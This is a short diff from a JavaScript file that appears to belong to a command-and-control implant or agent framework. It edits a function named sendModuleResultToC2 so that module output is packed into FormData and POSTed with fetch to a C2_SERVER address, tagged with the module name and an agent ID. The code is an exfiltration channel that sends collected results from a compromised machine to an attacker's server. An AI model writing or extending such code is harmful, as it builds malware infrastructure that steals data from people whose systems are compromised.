@@ -331,7 +331,9 @@ function deregisterModule(name){
   });
 }
 
-function sendModuleResultToC2(name, data){
+function sendModuleResultToC2(name, value){
+  data = new FormData();
+  data.append('result', value);
   fetch(C2_SERVER + '/module/' + name + '/' + agentID, {
     body: data,
     method: 'POST'
